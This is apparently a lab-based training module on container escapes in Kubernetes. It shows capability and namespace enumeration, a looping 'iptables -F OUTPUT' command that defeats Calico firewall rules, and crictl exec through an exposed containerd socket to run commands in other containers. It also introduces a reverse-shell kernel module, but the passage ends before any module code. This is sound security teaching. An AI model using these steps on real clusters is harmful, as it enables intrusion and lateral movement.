_Security assessments_ against modern applications might result in a shell within a container. After we _enumerate_ the container and discover all the accessible information, we need to find a way to elevate our access.

The host that runs the container is a great target for _privilege escalation_. Since we expect _containerization_ to isolate a process, information and processes available outside of that isolation are a great target. Ideally, we would obtain _shell_ on the host running the container.

However, this won't always be possible. Certain _misconfigurations_ may allow us to execute commands on the host or reconfigure the host. When we find such situations, it's important for us to know how to exploit the container.

Each _container escape_ that we discuss will assume that we have some level of code execution in the container. The purpose of this Learning Module is to demonstrate various methods of escaping a container, not gaining initial access, which is done with a variety of vulnerabilities.

In this Learning Module, we will cover the following Learning Units:

- Modifying the Host
- Executing Commands on the Host

## 7.1. Modifying the Host

Ideally, containerization prevents a process from making impactful modifications to the host. In fact, _Linux capabilities_ were one of the features added to a _kernel_ to limit what a _privileged process_ might be able to do. However, a process often requires access to certain capabilities to operate as expected. In these instances, an engineer might have added capabilities to a container that we can use to modify the host.

The containers with added capabilities are often the ones that also share a _namespace_ with the host. For example, a _network monitoring process_ might need to share the _network_ namespace with the host and have the ability to manage the network. Thus, we often find powerful capabilities with _shared_ namespaces, further widening the attack surface.

This Learning Unit covers the following Learning Objectives:

1. Understand how to access the lab
2. Discover which namespaces and capabilities run in the target container
3. Enumerate information about the Container Network Interface
4. Modify the firewall rules to allow scanning of previously blocked networks

## 7.1.1. Accessing the Labs - Modifying Host Networking

In this Learning Unit, we'll use a single server to learn about modifying hosts. This is an _Ubuntu 20.04_ machine running a _K3s Kubernetes cluster_. The target application, "quotes", provides the user with a random quote. The application has four _microservices_ (_frontend_, _backend_, _login_, and _monitor_). We obtained access to a container in the monitor service. As we'll find, this service has special permissions that will allow us to modify the host and obtain further access into the environment. This further enumeration allows us to discover an additional host that contains the _database_.

To access the server, we have created an **/etc/hosts** file entry on our _Kali Linux_ VM.

```
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.121.101  quotes
```

> Listing 1 - /etc/hosts entry

For now, we'll simply set up our **hosts** file on our Kali machine and start the virtual machine. While we are progressing through the Learning Unit, we will connect to our shell via SSH on port 2222. From this shell, we will conduct our attack. It's important to note that this container has several _non-standard binaries_ (such as **nmap**). We've provided these to simplify _enumeration_. In the real world, these would have to be transferred or installed.

For now, let's start the host for this portion and continue with the Learning Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Modifying Host Networking - Quotes Application|||

## 7.1.2. CAP_NET_ADMIN - Modifying Host Networking

In this section, we will conduct a fictional penetration test against an application to focus on escaping a container. Obtaining initial access to the system is out of scope for this section. Instead, we will start with shell access. Let's start by reviewing the application information we have gathered thus far.

We have discovered four endpoints: the _frontend_ that displays the _HTML_, the _quotes_ endpoint that returns the _list of quotes_, a _login_ endpoint, which is currently _disabled_, and finally, a _monitor_ endpoint, which we have compromised. We tried to enumerate further, but were unable to discover any other information about the rest of the cluster or environment.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/9952d823d7dd282630014fa9a335a894_MD5.jpg]]

Figure 1: Network Diagram of Shell

Let's connect to our shell via SSH and continue our enumeration. The username is _root_ and the password is _root_.

```
kali@kali:~$ ssh -p 2222 root@quotes
root@quotes's password:
Welcome to Alpine!
...

quotes:~#
```

> Listing 2 - Obtaining a shell in the Monitor Container

Using _information gathering_ techniques, we can find that this container is running in a K3s Kubernetes container with _containerd_ as the runtime.

```
quotes:~# mount | grep overlay
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/126/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/126/work,xino=off)
```

> Listing 3 - Discovering the Runtime

Using the **capsh** command, we can print the capabilities we have access to.

```
quotes:~# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
...
```

> Listing 4 - Discovering Capabilities in Container

Reviewing the capabilities indicates we have mostly standard capabilities, except for _CAP_NET_ADMIN_. If we search for this capability in the documentation,[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1083-1), we'll find that it allows us to do the following:

```
CAP_NET_ADMIN
      Perform various network-related operations:
      * interface configuration;
      * administration of IP firewall, masquerading, and
         accounting;
      * modify routing tables;
      * bind to any address for transparent proxying;
      * set type-of-service (TOS);
      * clear driver statistics;
      * set promiscuous mode;
      * enabling multicasting;
      * use setsockopt(2) to set the following socket options:
         SO_DEBUG, SO_MARK, SO_PRIORITY (for a priority outside
         the range 0 to 6), SO_RCVBUFFORCE, and SO_SNDBUFFORCE
```

> Listing 5 - Documentation of CAP_NET_ADMIN

This capability offers quite a bit of access to us. We can change _firewall_ rules, update the _routing table_, and enable _interception of network packets_ on a network device.

Let's keep poking around and find the namespaces attached to this container.

```
quotes:~# ls -Lil /proc/1/ns/ | sort
4026531835 -r--r--r--    1 root     root             0 Oct 14 18:28 cgroup
4026531837 -r--r--r--    1 root     root             0 Oct 14 18:28 user
4026531838 -r--r--r--    1 root     root             0 Oct 14 18:28 uts
4026531888 -r--r--r--    1 root     root             0 Oct 13 17:29 net
4026532778 -r--r--r--    1 root     root             0 Oct 14 18:28 ipc
4026532780 -r--r--r--    1 root     root             0 Oct 14 18:28 mnt
4026532781 -r--r--r--    1 root     root             0 Oct 14 18:28 pid
4026532781 -r--r--r--    1 root     root             0 Oct 14 18:28 pid_for_children
```

> Listing 6 - Discovering Namespaces in Container

If we review the inodes of the namespace files, we find that the cgroup, user, UTS, and network namespaces were created before the IPC, MNT, and PID namespace. This most likely means that we share the cgroup, user, UTS, and network namespaces with the host. While cgroup, user, and the UTS namespaces are often shared with the host in default container runtime configurations, network is not. The network namespace was most likely added by the user. By default, a container usually runs in an unshared network namespace.

This means that we should be able to list and modify the host's _network devices_. Let's use **ip a** to list the _network interfaces_.

```
quotes:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP qlen 1000
    link/ether 00:50:56:95:2b:45 brd ff:ff:ff:ff:ff:ff
    inet 192.168.51.101/24 brd 192.168.50.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe95:2b45/64 scope link
       valid_lft forever preferred_lft forever
...
```

> Listing 7 - Listing the Network interfaces

We get a long list of network interfaces, but the most important one for us is _ens160_. This interface is most likely the host's main interface. The network shown is in the **192.168.51.0/24** network. Let's use **nmap** to conduct a scan on the network and try to find additional hosts.

Don't forget to replace the third octet with the one found in your lab.

```
quotes:~# nmap 192.168.51.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 18:43 UTC
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 192.168.51.9, 16) => Operation not permitted
Offending packet: TCP 192.168.51.31:59603 > 192.168.51.9:22 S ttl=57 id=54420 iplen=44  seq=930469594 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 192.168.51.23, 16) => Operation not permitted
Offending packet: TCP 192.168.51.31:59603 > 192.168.51.23:22 S ttl=46 id=54664 iplen=44  seq=930469594 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 192.168.51.24, 16) => Operation not permitted
...
```

> Listing 8 - Errors in nmap

Fairly quickly, **nmap** starts throwing _errors_ and we are forced to stop the scan. The errors state that the "Operation [is] not permitted". Multiple things may be causing this error.

Kubernetes uses the _Container Network Interface_[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1083-2) (CNI) to supply _specifications_ and a _framework_ for providers to manage the _pod_ networking. CNI providers are the mechanisms that build the actual network for a cluster. Common providers include _Flannel_,[3](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1083-3) _Cilium_,[4](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1083-4) and _Calico_.[5](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1083-5)

These CNI providers offer the ability to create _network policies_ to _block_ and _allow_ traffic originating on the host. This is typically used to _manage the traffic between pods_, but CNIs can also manage the _host's networking_. This includes blocking _incoming_ and _outgoing_ traffic and might be what is blocking our scans.

CNIs can use multiple methods to manage these network rules. The use of _iptables_[6](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1083-6) is most common. However, they can also use _eBPF_. If the CNI uses iptables, we should be able to manage the rules that are blocking our scan with the CAP_NET_ADMIN capability and get access to the host's _network_ namespace. If eBPF is used, the CAP_NET_ADMIN and _shared network_ namespace is not enough. While we could use the **iptables** command with the **-L** option to list the rules, we'll instead use **iptables-save**, which will output the iptables rules with the comments about what they do.

```
quotes:~# iptables-save
...
:PREROUTING ACCEPT [7341888:2366413864]
:OUTPUT ACCEPT [7416830:1989470997]
:cali-OUTPUT - [0:0]
:cali-PREROUTING - [0:0]
:cali-from-host-endpoint - [0:0]
:cali-rpf-skip - [0:0]
:cali-to-host-endpoint - [0:0]
-A PREROUTING -m comment --comment "cali:6gwbT8clXdHdC1b1" -j cali-PREROUTING
-A OUTPUT -m comment --comment "cali:tVnHkvAo15HuiPy0" -j cali-OUTPUT
-A cali-OUTPUT -m comment --comment "cali:njdnLwYeGqBJyMxW" -j MARK --set-xmark 0x0/0xf0000
-A cali-OUTPUT -m comment --comment "cali:rz86uTUcEZAfFsh7" -j cali-to-host-endpoint
-A cali-OUTPUT -m comment --comment "cali:pN0F5zD0b8yf9W1Z" -m mark --mark 0x10000/0x10000 -j ACCEPT
-A cali-PREROUTING -m comment --comment "cali:XFX5xbM8B9qR10JG" -j MARK --set-xmark 0x0/0xf0000
-A cali-PREROUTING -i cali+ -m comment --comment "cali:EWMPb0zVROM-woQp" -j MARK --set-xmark 0x40000/0x40000
-A cali-PREROUTING -m comment --comment "cali:PWuxTAIaFCtsg5Qa" -m mark --mark 0x40000/0x40000 -j cali-rpf-skip
-A cali-PREROUTING -m comment --comment "cali:fSSbGND7dgyemWU7" -m mark --mark 0x40000/0x40000 -m rpfilter --validmark --invert -j DROP
-A cali-PREROUTING -m comment --comment "cali:ImU0-4Rl2WoOI9Ou" -m mark --mark 0x0/0x40000 -j cali-from-host-endpoint
-A cali-PREROUTING -m comment --comment "cali:lV4V2MPoMBf0hl9T" -m mark --mark 0x10000/0x10000 -j ACCEPT
...
:cali-pri-kns.calico-system - [0:0]
...
```

> Listing 9 - Running the iptables-save Command

In the output, we find chains and rules that are prefaced with "cali". We also find references to "calico-system". These are both indicators that "Calico" is in use. Since Calico is in the iptables rules, we can assume that Calico uses iptables to manage the connections. However, Calico might also employ a mix. Let's **grep** for the _first 2 octets_ of the subnet "192.168" to find rules that might be blocking this traffic.

```
quotes:~# iptables-save | grep 192.168
-A cali-po-default.webserver -d 192.168.0.0/16 -m comment --comment "cali:NPPLu41PkjksnZqh" -m comment --comment "Policy default.webserver egress" -j DROP
-A cali-po-_FsV3TUOTbI0_MhBGOJa -d 192.168.0.0/16 -p tcp -m comment --comment "cali:dW-0nda8otvf6YZt" -m comment --comment "Policy production/knp.default.allow-backend-egress egress" -m multiport --dports 9042 -j MARK --set-xmark 0x10000/0x10000
...
```

> Listing 10 - Greping For 192.168 in iptable Rules

The first rule we find is to _DROP_ all traffic to **192.168.0.0/16**. This is most likely what is blocking our scan. We also find that Calico allows the _outbound_ from the backend service to **192.168.0.0/16** on port 9042. We'll remember this for later.

Reviewing these firewall rules can be very confusing. While we won't do a deep dive into iptables, the most important thing we need to know is that the _INPUT_ chain is for _incoming traffic_ and the _OUTPUT_ chain is for _outgoing traffic_. Calico marks packets in these chains and then processes the rules in other chains. If we can change the _INPUT_ chain, we can change the rules for incoming packets and if we can change the _OUTPUT_ chain, we can change the rules for outgoing traffic.

Because we're trying to scan the network, we want to edit the _OUTPUT_ chain. Let's list it and delete all rules in the chain. This will default to allowing all traffic. We'll list the **OUTPUT** chain by using the **-L** argument and delete all the rules or "flush" the chain with **-F**.

```
quotes:~# iptables -L OUTPUT
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
cali-OUTPUT  all  --  anywhere             anywhere             /* cali:tVnHkvAo15HuiPy0 */
KUBE-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes service portals */
quotes:~# iptables -F OUTPUT
quotes:~# iptables -L OUTPUT
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

> Listing 11 - Flushing the OUTPUT Chain

Excellent! We were able to flush the chain.

Unfortunately, if we wait a few moments and check again, the rule will be reapplied.

```
quotes:~# iptables -L OUTPUT
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
cali-OUTPUT  all  --  anywhere             anywhere             /* cali:tVnHkvAo15HuiPy0 */
```

> Listing 12 - Rule Applied Again

This is because Kubernetes and Calico attempt to manage the state and prevent external factors from making changes. However, these checks occur _periodically_ enough that we can create a loop to flush the output chain consistently. Let's create a short script to do this.

We'll start by creating an infinite loop by using **while true**. Next, we'll run the **flush** command on iptables. We don't want this to execute immediately, so we'll add a **sleep** to slow it down. The amount of time we sleep is arbitrary, but we'll choose to sleep for _half a second_. We'll wrap the entire command in **sh -c** so that we can stop it with a _process ID_ if needed. Finally, we'll add an ampersand at the end to send the command to the background.

```
quotes:~# sh -c 'while true; do iptables -F OUTPUT; sleep .5; done' &
quotes:~# ps
PID   USER     TIME  COMMAND
...
  98 root      0:00 sh -c while true; do iptables -F OUTPUT; sleep .5; done
...
```

> Listing 13 - Flush Chain Forever

Now if we attempt to scan the network, we won't be blocked. Let's scan the network for that 9042 port we discovered earlier. We'll scan the entire **192.168.51.0/24** network again. This time, we'll specify the port with **-p** and only display hosts that have the port open.

Don't forget to replace the third octet with the one found in your lab.

```
quotes:~# nmap 192.168.51.0/24 -p 9042 --open
...
Nmap scan report for 192.168.51.102
Host is up (0.44s latency).

PORT     STATE SERVICE
9042/tcp open  unknown
MAC Address: 00:50:56:95:B4:43 (VMware)

Nmap done: 256 IP addresses (3 hosts up) scanned in 6.76 seconds
```

> Listing 14 - Scanning the Network

A quick search reveals that this is the port for the _Cassandra database_. Now, we'll find more information in the environment and have a point to continue enumeration.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/6e165c4d01a3183df022fb9eae8f5ac6_MD5.jpg]]

Figure 1: Network Diagram of Environment

Excellent! We were able to modify the outgoing firewall rules to discover an additional host on the network.

1

(Michael Kerrisk, 2021), [https://man7.org/linux/man-pages/man7/capabilities.7.html](https://man7.org/linux/man-pages/man7/capabilities.7.html) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1083-1)

2

(Linux Foundation, 2022), [https://www.cni.dev/](https://www.cni.dev/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1083-2)

3

(flannel, 2022), [https://github.com/flannel-io/flannel](https://github.com/flannel-io/flannel) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1083-3)

4

(Cilium, 2022), [https://cilium.io/](https://cilium.io/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1083-4)

5

(Tigera, 2022), [https://www.tigera.io/project-calico/](https://www.tigera.io/project-calico/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1083-5)

6

(Wikipedia, 2022), [https://en.wikipedia.org/wiki/Iptables](https://en.wikipedia.org/wiki/Iptables) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1083-6)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Modifying Host Networking - Quotes Application - Exercise

#### Labs

Connect to the discovered Cassandra Database and extract the secret.

Answer

## 7.2. Executing Commands

Executing commands in another container or on the host significantly increases our chances of conducting a successful security assessment.

Gaining command execution on the host is the ultimate goal of container privilege escalation. With this, we can manage the entire cluster, enter any container, and make any modifications we want.

However, this isn't always possible and we might only be able to move to another container. In that case, we'd want to migrate to another container and start the enumeration process again.

This Learning Unit covers the following Learning Objectives:

1. Access the lab
2. Discover an exposed CRI Socket
3. Execute commands in other containers using standard tooling
4. Load kernel modules to reach command execution on the host
5. Escape a privileged container with cgroups
6. Execute commands on the host with core_pattern and a privileged container
7. Use Kernel Exploits to execute command on the host from a container

## 7.2.1. Accessing the Labs - Lateral Movement

In this Learning Unit, we'll use multiple targets to learn about the various ways to execute commands in other containers and the host. The base of all of these targets is a bare-bones Ubuntu machine with a container runtime installed using default settings.

To access the server, we have created a couple **/etc/hosts** entries on our Kali Linux VM.

```
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.121.103  exposed_socket
192.168.121.100  sandbox
```

> Listing 1 - /etc/hosts entry

We'll set up our **hosts** file on our Kali machine and start the virtual machine. While we are progressing through the Learning Unit, we will connect to our shell via SSH on port 2222 or 32222. From this shell, we will conduct our attack. It's important to note that the victim container has several non-standard binaries (such as nmap). We've provided these to simplify access. In the real world, these would have to be transferred or installed.

For now, let's start the exposed_socket host for the "Exposed CRI Socket" portion and continue with the Learning Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - exposed_socket

## 7.2.2. Exposed CRI Socket - Lateral Movement

Many _cloud applications_ advertise some form of additional features to help secure or manage a cluster. To do that, the application must have access to control the cluster. The proper way to do this would be to assign a minimally privileged role to the pod running the management application. However, managing these permissions and ensuring users create the correct role is difficult. Instead, we often find applications requesting access to the _runtime socket_. This will provide the container with much more access than necessary.

Let's connect to our shell and explore the environment. We'll use **ssh** to connect on port 32222 to the exposed_socket target we set in our **/etc/hosts**.

```
kali@kali:~$ ssh -p 32222 root@exposed_socket
root@exposed_socket's password:
..

victim:~#
```

> Listing 15 - Connecting to the target

We'll start by checking which files or directories the container has _mounted_. To do this, we'll run the **mount** command and review it for any data that is not standard.

```
victim:~# mount
...
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
tmpfs on /run/containerd/containerd.sock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=400412k,mode=755,inode64)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=4004096k,inode64)
...
```

> Listing 16 - Checking mounts for sensitive Files or Directories

We find that a mount has been created on **/run/containerd/containerd.sock**. This is the socket for the _containerd_ runtime. Access to this might allow us to execute commands on other containers or even escape the container.

We also find that we have a mount for **/run/secrets/kubernetes.io/serviceaccount**, indicating that this is a pod running in the Kubernetes cluster. This is important because if the containerd socket is the runtime used by Kubernetes, we may have limited options. Kubernetes runs routine container _garbage collection_,[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1087-1) which will remove any new containers we start before the container can actually execute anything. Let's keep this in mind as we go through this section.

In order to interact with the containerd socket, we need a client. We could build our own, or we can use a pre-built one. For example, _crictl_[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1087-2) was designed as a _CLI tool_ to interact with CRI compatible runtimes. The containerd runtime is compatible with CRI.

We'll start by downloading this tool on Kali and extracting it.

```
kali@kali:~$ wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.25.0/crictl-v1.25.0-linux-amd64.tar.gz
...

crictl-v1.25.0-linux-amd64.tar 100%[=================================================>]  19.34M  3.44MB/s    in 5.4s

kali@kali:~$ tar -xvf crictl-v1.25.0-linux-amd64.tar.gz
crictl
...
```

> Listing 17 - Downloading crictl

Once downloaded, we'll need to transfer the tool to the target. While we won't have access to SSH in most real world scenarios, we do in this instance, so we'll use the **scp** command. We'll specify the port the container is listening on with **-P**, indicate which file we want to transfer (**crictl**), and prepend the location with the SSH target (**root@exposed_socket:/usr/bin/crictl**).

```
kali@kali:~$ scp -P 32222 crictl root@exposed_socket:/usr/bin/crictl
root@exposed_socket's password:
crictl                  100%   47MB 163.2MB/s   00:00
```

> Listing 18 - Transferring crictl

Next, we'll go back to the SSH session on our victim container. Since crictl can interact with multiple runtimes, we need to specify which socket it should interact with. To do this, we need to create a _YAML_ configuration file in **/etc/crictl.yaml**. The _runtime-endpoint_ parameter will need to be set to the path of the socket (**/run/containerd/containerd.sock**) with **unix://** to clarify that this is a _Unix socket_.

```
victim:~# echo "runtime-endpoint: unix:///run/containerd/containerd.sock" > /etc/crictl.yaml
```

> Listing 19 - Configuring the crictl Client

At this point, we should be able to interact with the socket. Let's try listing the running containers with the **ps** subcommand within **crictl**.

```
victim:~# crictl ps
CONTAINER           IMAGE             STATE      NAME             
338ed73d2cd4c       d0af5b8ae9b54     Running    victim
fc9d6defaa941       a6215f271958c     Running    sensitive-data-handler 
ea178e2f7f8c5       b19406328e70d     Running    coredns
75c78feb64647       ba04bb24b9575     Running    storage-provisioner
f04e071fd86b0       7ba9b35cf55e6     Running    kindnet-cni
ed2ae7da4d031       68348500321ce     Running    kube-proxy
fb9f5fbeeb938       c6c296d440245     Running    kube-controller-manager
f845b345af4f2       0b1fb9b45fa3d     Running    kube-apiserver
a10d82fffbf7f       8e041a3b0ba8b     Running    etcd
93e70dd44fa8f       873dc124ec692     Running    kube-scheduler
...
```

> Listing 20 - Listing Containers Running on Target

The output in the listing above has unnecessary columns removed for ease of reading.

The ps command shows several containers. The containers prepended with **kube** indicate that this is most likely the runtime used by Kubernetes. This means that we won't be able to start new containers since the garbage collection will remove them.

In this list, we find many standard Kubernetes containers and two non-standard ones. The first is the victim container, which we are currently running in. The next is the sensitive-data-handler container. We don't know what that is, but it sounds interesting.

While the garbage collection will prevent us from starting a new container, we should be able to execute commands in existing containers. Let's try to execute commands in the sensitive-data-handler container. We'll remember its container ID (fc9d6defaa941) for later.

The **exec** sub command will help with executing commands. Let's display the **help** menu for this subcommand.

```
victim:~# crictl exec --help
NAME:
   crictl exec - Run a command in a running container

USAGE:
   crictl exec [command options] CONTAINER-ID COMMAND [ARG...]

OPTIONS:
   --interactive, -i  Keep STDIN open (default: false)
   --sync, -s         Run the command synchronously (default: false)
   --timeout value    Timeout in seconds (default: 0)
   --tty, -t          Allocate a pseudo-TTY (default: false)
```

> Listing 21 - The Exec Subcommand in crictl

We find that to run **exec**, we need to provide the container ID and the command we want to execute. Let's attempt to execute the **hostname** and **whoami** command on the sensitive-data-handler container by specifying its ID: **fc9d6defaa941**.

```
victim:~# crictl exec fc9d6defaa941 hostname
sensitive-data-handler-56cc6f54b7-6nr8q

victim:~# crictl exec fc9d6defaa941 whoami
root
```

> Listing 22 - Executing Commands in Another Container

Excellent. From here, we should be able to _pivot_ and access data from the container. Where we move from this point depends on the access the other containers have.

It's important to note that running commands on the Kubernetes systems can potentially lead to a full compromise of the cluster. For example, access to the _etcd_ container in Kubernetes might allow us to add new _cluster-admin_ users. While these attacks are valid, they are out of scope for this Learning Module.

1

(Kubernetes, 2022), [https://kubernetes.io/docs/concepts/architecture/garbage-collection/#containers-images](https://kubernetes.io/docs/concepts/architecture/garbage-collection/#containers-images) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1087-1)

2

(Kubernetes Sigs, 2022), [https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md](https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1087-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - Exposed CRI Socket - 1

Containers - Exposed CRI Socket - 2

Containers - Exposed CRI Socket - 3

Containers - Exposed CRI Socket - 4

#### Labs

Using the "Containers - Exposed CRI Socket - 1" VM, connect to the victim via ssh on port 32222 with the username root and the password root. Exploit the exposed socket to read the flag in **/root/proof.txt** on the sensitive-data-handler container. Please note that the service may take an additional 5 minutes to start.

Answer

Using the "Containers - Exposed CRI Socket - 2" VM, connect to the victim via ssh on port 32222 with the username root and the password root. Exploit the exposed socket to find the secret variable in the etcd key-value store. The flag is held in a configmap named corporatesecrets. Please note that the service may take an additional 5 minutes to start.

Answer

Using the "Containers - Exposed CRI Socket - 3" VM, connect to the victim via ssh on port 32222 with the username root and the password root. Exploit the exposed socket to find the python-worker container. Read the flag in **/root/proof.txt**. Please note that the service may take an additional 5 minutes to start.

Answer

Using the "Containers - Exposed CRI Socket - 4" VM, connect to the victim via ssh on port 32222 with the username root and the password root. Exploit the exposed socket to find the fetcher container. Read the flag in **/root/proof.txt**. Please note that the service may take an additional 5 minutes to start.

Answer

## 7.2.3. Accessing the Labs - Loading Kernel Modules

In this next section, we'll use a single target to learn about escaping a container with the _CAP_SYS_MODULE_ capability.

Let's start the virtual machine for this section below and connect to our shell via SSH on port 2222. From this shell, we will conduct our attack. It's important to note that the victim container has several non-standard binaries (such as nmap). We've provided these to simplify access, but in the real world, they would have to be transferred or installed.

Let's start the "sys_module Target" host for the "CAP_SYS_MODULE - Loading Kernel Modules" portion of this Learning Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - sys_module Target

## 7.2.4. CAP_SYS_MODULE - Loading Kernel Modules

In this module we will be compiling a kernel module for an x86_64 target. If you are running kali on a arm processor, like in the M1 mac, the compiled module will not work on the target.

While infrequent, certain containerized applications might require the ability to load _kernel modules_. For this to work, the process must have the CAP_SYS_MODULE capability added. This capability should be used with caution as it allows attackers to execute code in the kernel, which can lead to dangerous _rootkits_. In our example, we'll load a kernel module that will run a _usermode reverse shell_.

Let's exploit a container with this capability and execute commands on the host. We'll start by connecting to our shell via **ssh** on port 2222 and the **sandbox** host.

```
kali@kali:~$ ssh -p 2222 root@sandbox
root@sandbox's password:
Welcome to Alpine!
...

victim_cap_sys_module:~#
```

> Listing 23 - Obtaining a shell in the Monitor Container

Next, let's check the capabilities of the container by using **capsh --print**.

```
victim_cap_sys_module:~# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
...
```

> Listing 24 - Checking Which Capabilities the Container was Started With

As shown by the output, our container has the CAP_SYS_MODULE capability. While we could write and compile the capability on this container, this poses a problem. As containers should be built with the minimum required packages, we most likely won't have all the required software to build and compile a kernel module. At a minimum, we would need **insmod** or **kmod** to load the module and **make** and **gcc** to compile the module.

Let's check if the target contains these packages.

```
victim_cap_sys_module:~# kmod
-ash: kmod: not found

victim_cap_sys_module:~# make
-ash: make: not found

victim_cap_sys_module:~# gcc
-ash: gcc: not found
```

> Listing 25 - Checking if Required Packages Exist

